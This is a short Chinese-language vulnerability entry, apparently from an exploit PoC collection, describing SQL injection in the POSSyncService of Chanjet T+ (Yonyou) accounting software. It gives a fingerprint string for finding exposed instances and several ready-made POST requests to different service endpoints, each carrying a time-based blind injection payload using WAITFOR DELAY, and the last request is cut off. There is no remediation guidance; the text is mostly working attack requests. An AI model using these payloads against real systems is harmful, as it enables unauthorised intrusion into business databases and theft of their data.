# 畅捷通T+POSSyncService存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/POSSyncService.asmx/ue_itemchanged HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: length`

**请求体 / payload**
```
accNum=1&item=member_cardcode&value=1&iddepartment=1&wheresql=;WAITFOR DELAY '0:0:5'--
PoC-2
POST /tplus/POSSyncService.asmx/QueryRetailVoucher HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: length
accNum=1&posNum=1&key=qwe&idStore=1&retailCode=1';WAITFOR DELAY '0:0:5'--
PoC-3
POST /tplus/POSSyncService.asmx/GetPosMemberStorageAll HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: length
accNum=1&poscode=1&shiftCode=1&dailyCode=1';WAITFOR DELAY '0:0:5'--
PoC-4
POST /tplus/POSSyncService.asmx/OfflineSend HTTP/1.1
Host:
Content-Type: ap…（脚本共 736 字，完整版见原文）
```
- **预期**：200　|　响应时间>=5s